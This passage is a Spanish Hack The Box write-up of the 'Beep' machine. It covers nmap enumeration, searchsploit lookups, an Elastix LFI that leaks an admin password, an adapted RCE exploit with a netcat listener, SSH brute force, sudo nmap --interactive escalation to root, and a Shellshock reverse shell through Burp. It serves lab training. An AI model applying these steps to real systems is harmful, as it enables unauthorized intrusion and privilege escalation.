      <li><strong>-oG:</strong> Exporta los resultados en formato grepeable, facilitando el filtrado posterior.</li>
    </ul>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/beep/nmap1.png" alt="Nmap" width="800" />
</p>

<p>Una vez concluido el escaneo de puertos, se utiliza una herramienta personalizada llamada <strong>extractPorts</strong> (definida en el .zshrc) para copiar los puertos relevantes al portapapeles y proceder a la enumeración de servicios.</p>

<p align="center">
  <img src="/assets/images/htb/beep/extra.png" alt="ExtractPorts" width="900" />
</p>

<hr />

<h2 id="2-enumeración-de-servicios-de-los-puertos">2. Enumeración de Servicios de los Puertos</h2>

<p>Con la lista de puertos obtenida, se procede a identificar los servicios que corren en ellos. Esto permite conocer las versiones y configuraciones, facilitando la detección de posibles vulnerabilidades.</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>nmap -sCV -p22,25,80,110,111,143,443,857,993,995,3306,4190,4445,4559,5038,10000 -oN targeted</code></pre>
</div>

    <ul>
      <li><strong>-sC:</strong> Ejecuta scripts básicos de reconocimiento.</li>
      <li><strong>-sV:</strong> Detecta versiones y servicios.</li>
      <li><strong>-oN:</strong> Exporta los resultados en un formato normal.</li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="3-análisis-de-servicios">3. Análisis de Servicios</h2>

<p>Durante esta etapa se observa que el puerto 80 aloja dos servicios HTTP y otro servicio se ejecuta en el puerto 10000. Se procede a examinar la web mediante un navegador y, utilizando la extensión <strong>Wappalyzer</strong> de Firefox, se identifican las tecnologías empleadas.</p>

<p>Al acceder a la web se produce una redirección al puerto 443 (HTTPS) y se presenta el error “SSL_ERROR_UNSUPPORTED_VERSION”. Para solventarlo, se modifican las configuraciones TLS del navegador.</p>

<p align="center">
  <img src="/assets/images/htb/beep/tls.png" alt="TLS Error" width="2500" />
</p>

<p>Finalmente, se revela un panel de login de Elastix:</p>

<p align="center">
  <img src="/assets/images/htb/beep/loginela.png" alt="Login Elastix" width="700" />
</p>

<hr />

<h2 id="4-identificación-de-vulnerabilidades">4. Identificación de Vulnerabilidades</h2>

<p>Se prueba inicialmente el acceso al panel utilizando las contraseñas por defecto, sin éxito. A continuación, se emplea la herramienta <strong>searchsploit</strong> (de ExploitDB) para buscar vulnerabilidades relacionadas con Elastix.</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>searchsploit Elastix</code></pre>
</div>
  </li>
</ul>

<p align="center">
  <img src="/assets/images/htb/beep/exdb.png" alt="ExploitDB Elastix" width="1500" />
</p>

<p>Se detecta que el sistema puede ser vulnerable tanto a RCE (Remote Code Execution) como a LFI (Local File Inclusion).</p>

<hr />

<h2 id="5-explotación-de-vulnerabilidades">5. Explotación de Vulnerabilidades</h2>

<h3 id="análisis-y-explotación-de-la-vulnerabilidad-lfi">Análisis y Explotación de la Vulnerabilidad LFI</h3>

<p>Se identifica una vulnerabilidad LFI en la URL que permite listar directorios del sistema, revelando archivos críticos (como <code class="language-plaintext highlighter-rouge">passwd</code>, <code class="language-plaintext highlighter-rouge">hosts</code>) y detalles sobre los puertos activos en <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code>.</p>

<ul>
  <li><strong>Comando para confirmar la vulnerabilidad:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>searchsploit Elastix -x &lt;ID_exploit&gt;</code></pre>
</div>
  </li>
</ul>

<p>Con esta vulnerabilidad, se prueban combinaciones de usuario y contraseña en el login de Elastix, obteniéndose acceso con las credenciales:</p>
<ul>
  <li><strong>Usuario:</strong> admin</li>
  <li><strong>Contraseña:</strong> jEhdIekWmdjE</li>
</ul>

<h3 id="explotación-de-la-vulnerabilidad-rce">Explotación de la Vulnerabilidad RCE</h3>

<p>También, se investiga una vulnerabilidad RCE, adaptando un exploit encontrado en Exploit-DB para evitar problemas de versión. Antes de lanzar el script, se prepara un listener en netcat:</p>

<ul>
  <li><strong>Comando para iniciar netcat:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>nc -nlvp 443</code></pre>
</div>
  </li>
</ul>

<p>El exploit se adapta (actualizando librerías y ajustando parámetros) y, al ejecutarlo, se consigue una shell interactiva con el usuario <strong>asterisk</strong>.</p>

<p align="center">
  <img src="/assets/images/htb/beep/rce.png" alt="Vulnerabilidad RCE" width="5600" />
</p>

<p align="center">
  <img src="/assets/images/htb/beep/exploit.png" alt="Exploit Adaptado" width="5300" />
</p>

<p>Además, se intentó acceder por SSH en el puerto 22 usando fuerza bruta con las credenciales obtenidas en el LFI, pero se recibió el siguiente error:</p>
<blockquote>
  <p><code class="language-plaintext highlighter-rouge">ssh root@10.129.27.99: Unable to negotiate with 10.129.27.99 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1, diffie-hellman-group14-sha1, diffie-hellman-group1-sha1</code></p>
</blockquote>

<p>Para solucionarlo, se utiliza el siguiente comando ajustado:</p>

<ul>
  <li><strong>Comando para SSH:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa,ssh-dss root@10.129.27.99</code></pre>
</div>
  </li>
</ul>

<h2 id="y-sobre-este-se-aplica-la-fuerza-bruta-con-dos-diccionarios-personalizados-uno-para-users-y-otro-para-posibles-passwords">Y sobre este se aplica la fuerza bruta con dos diccionarios personalizados, uno para users y otro para posibles passwords.</h2>

<h2 id="6-post-explotación">6. Post-Explotación</h2>

<p>Tras obtener el acceso con el exploit en python del RCE, se realiza un tratamiento a la consola:</p>

<ul>
  <li>Iniciar una sesión:
    <ul>
      <li><strong>Comando:</strong>
        <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>script /dev/null -c bash</code></pre>
</div>
      </li>
    </ul>
  </li>
  <li>Suspender la shell con <code class="language-plaintext highlighter-rouge">ctrl+z</code>.</li>
  <li>Reanudar la shell en modo raw:
    <ul>
      <li><strong>Comando:</strong>
        <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>stty raw -echo; fg</code></pre>
</div>
      </li>
    </ul>
  </li>
  <li>Restablecer el entorno:
    <ul>
      <li><strong>Comando:</strong>
        <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>reset xterm</code></pre>
</div>
      </li>
    </ul>
  </li>
  <li>Configurar las variables de entorno:
    <ul>
      <li><strong>Comandos:</strong>
        <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>export TERM=xterm
export SHELL=bash</code></pre>
</div>
      </li>
    </ul>
  </li>
</ul>

<p>También ajustar la resolución de la terminal para mejorar la visibilidad por si necesitamos hacer algún comando de editor de texto, la resolución sea ajustada:</p>

<ul>
  <li><strong>Ver dimensiones de nuestra terminal:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>stty -a</code></pre>
</div>
  </li>
  <li><strong>Ajustar filas y columnas (ejemplo):</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>stty rows 24 columns 80</code></pre>
</div>
  </li>
</ul>

<hr />

<h2 id="7-escalada-de-privilegios">7. Escalada de Privilegios</h2>

<p>Una vez obtenida una shell interactiva, se procede a investigar posibles vectores de escalada de privilegios. Se comienza verificando qué comandos se pueden ejecutar con privilegios elevados:</p>

<ul>
  <li><strong>Comando para listar permisos sudo:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>sudo -l</code></pre>
</div>
  </li>
</ul>

<p>En este caso, se detectaron posibilidades para escalar privilegios mediante:</p>
<ul>
  <li>El uso de GTFOBins para explotar comandos como <strong>yum</strong>.</li>
  <li>Otra técnica sobre <strong>nmap</strong> en modo interactivo (en versiones 2.02 a 5.21) con:
    <ul>
      <li><strong>Comando interactivo:</strong>
        <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>sudo nmap --interactive</code></pre>
</div>
      </li>
      <li>Dentro de la consola interactiva, se puede escribir <code class="language-plaintext highlighter-rouge">!sh</code> para obtener una shell con privilegios de root.</li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="8-otras-formas-de-explotación">8. Otras Formas de Explotación</h2>

<p>Esta fue la forma que encontré para resolver esta máquina, pero hay muchas más. Una de ellas es usadno un shellshock atack por el panel de login que se muestraba en el puerto 100000.</p>

<p align="center">
  <img src="/assets/images/htb/beep/shock.png" alt="schok" width="1500" />
</p>

<p>Vemos que al hacer un login erróneo nos redirige a un get de un archivo con extension .cgi
Desde burpsuite podemos interceptar el método GET de esa página y editar la cabecera de nuestro User Agent (en Referer tambien y en otros campos más) para efectuar el ShellShock atack y mandarnos una consola interactiva por el puerto 444.</p>

<p align="center">
  <img src="/assets/images/htb/beep/burp.png" alt="burp" width="5100" />
</p>

<p>Así conseguimos ganar acceso a la máquina y directamente como el usuario root.</p>]]></content><author><name>Álvaro Ruiz Gutiérrez</name></author><category term="HTB" /><category term="WriteUp" /><category term="eWPT" /><category term="Elastix" /><category term="LFI" /><category term="Information Leakage" /><category term="Vtiger" /><category term="File Upload" /><category term="RCE" /><category term="Shellshock Attack" /><category term="TLS" /><category term="Linux" /><category term="Fácil" /><category term="eWPT" /><summary type="html"><![CDATA[En este artículo, resolveremos la máquina Beep de la plataforma HTB.]]></summary></entry></feed>